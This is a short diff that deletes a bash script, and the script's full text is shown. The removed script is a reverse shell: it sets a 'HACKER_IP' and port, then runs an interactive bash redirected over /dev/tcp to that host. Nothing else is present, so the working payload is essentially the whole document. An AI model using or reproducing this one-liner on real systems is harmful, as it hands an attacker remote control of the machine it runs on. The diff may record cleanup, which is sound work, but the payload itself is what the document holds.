@@ -1,7 +1,0 @@
-#!/bin/bash
-
-# EDIT ACCORDINGLY
-HACKER_IP=192.168.45.166
-HACKER_PORT=4443
-
-bash -i >& /dev/tcp/$HACKER_IP/$HACKER_PORT 0>&1
